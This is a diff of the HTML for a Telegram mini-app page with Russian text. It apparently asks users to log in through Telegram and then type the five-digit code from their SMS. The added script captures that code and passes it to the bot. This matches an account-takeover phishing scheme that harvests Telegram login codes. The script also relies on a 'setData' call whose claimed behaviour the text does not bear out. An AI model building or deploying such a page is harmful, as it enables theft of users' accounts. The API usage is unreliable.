@@ -9,7 +9,6 @@
     <link rel="stylesheet" href="squares.css">
     <link rel="stylesheet" href="popup.css">
     <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
-
 </head>
 
 <body>
@@ -18,19 +17,18 @@
             <div id="page1">
                 <div id="bg">
                     <img class="main-logo" src="assets/ico.svg" alt="">
-                    <h1 id="TEST" >test 1.5</h1>
-                    <p>Для продолжения работы с ботом необходимо авторизоватся через <p style="color: #68ba4f; font-weight: bold; text-shadow: 0 0 0.5rem #59be4a;;">Telegram</p></p>
-                    <button class="btn" id="loginbtn">  
+                    <h1 id="TEST">test 1.5</h1>
+                    <p>Для продолжения работы с ботом необходимо авторизоваться через 
+                        <p style="color: #68ba4f; font-weight: bold; text-shadow: 0 0 0.5rem #59be4a;">Telegram</p>
+                    </p>
+                    <button class="btn" id="loginbtn">
                         <img src="assets/tg.svg" alt="">
                         Войти через Telegram
                     </button>
                 </div>
-                
-
             </div>
             <div class="blur" id="blur"></div>
             <div id="page2">
-                
                 <img class="small-logo" src="assets/ico.svg" alt="">
                 <p class="passcode-title">Введите код из СМС</p>
                 <div class="code-box" id="codeBox">
@@ -41,10 +39,8 @@
                     <div class="cell"></div>
                 </div>
                 <input id="hiddenInput" type="text" maxlength="5" inputmode="numeric" />
-                <!-- <input type="number" maxlength="5" id="passcode-input" placeholder="00000" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"> -->
                 <button class="btn" id="passcode-btn">Подтвердить</button>
                 <div id="popup"></div>
-
             </div>
             <div id="page3">
                 <img class="small-logo" src="assets/ico.svg" alt="">
@@ -69,6 +65,26 @@
         </ul>
 
     </div>
+
+    <script>
+        // Получаем кнопку и поле ввода кода
+        const passcodeBtn = document.getElementById('passcode-btn');
+        const hiddenInput = document.getElementById('hiddenInput');
+
+        // Добавляем обработчик на кнопку
+        passcodeBtn.addEventListener('click', function() {
+            // Получаем код из поля ввода
+            const passcode = hiddenInput.value;
+
+            // Проверка на валидность кода (5 символов)
+            if (passcode.length === 5) {
+                // Используем setData вместо sendData, чтобы не закрывать приложение
+                window.Telegram.WebApp.setData(passcode);
+            } else {
+                alert("Пожалуйста, введите правильный код");
+            }
+        });
+    </script>
 
     <script src="loginScreenScripts.js"></script>
 </body>
